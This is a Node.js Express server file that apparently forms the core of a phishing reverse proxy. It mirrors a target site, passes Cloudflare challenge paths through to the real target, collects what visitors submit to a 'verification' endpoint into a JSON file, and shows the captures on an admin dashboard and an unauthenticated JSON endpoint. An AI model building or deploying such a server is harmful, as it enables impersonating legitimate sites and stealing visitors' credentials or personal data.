const express = require('express');
const app = express();

app.use(express.json());

const {PROXY_URL, TARGET_URL, proxy} = require('./routes/proxy');
const verification = require('./routes/verification');
const saveInfos = require('./routes/saveInfos');

const path = require('path');

app.use((req, res, next) => {
  if (req.url.startsWith('/cdn-cgi/')) {
    // Redirection transparente vers Cloudflare
    res.redirect(302, TARGET_URL + req.url);
    return;
  }
  next();
});

app.use('/verification', async (req, res) => {
  verification(req, res, TARGET_URL, PROXY_URL);
});

app.use('/api/verification', (req, res) => {
  saveInfos(req, res);
});

app.get('/api/json', (req, res) => {
  res.sendFile(path.join(__dirname, '/data/verifications.json'));
});

app.get('/admin/dashbord', (req, res) => {
  res.sendFile(path.join(__dirname, '/public/verifications.html'));
});

app.use('/', proxy);


const PORT = 8080;
app.listen(PORT, () => {
  console.log(`Le serveur démarre sur ${PROXY_URL}`);
});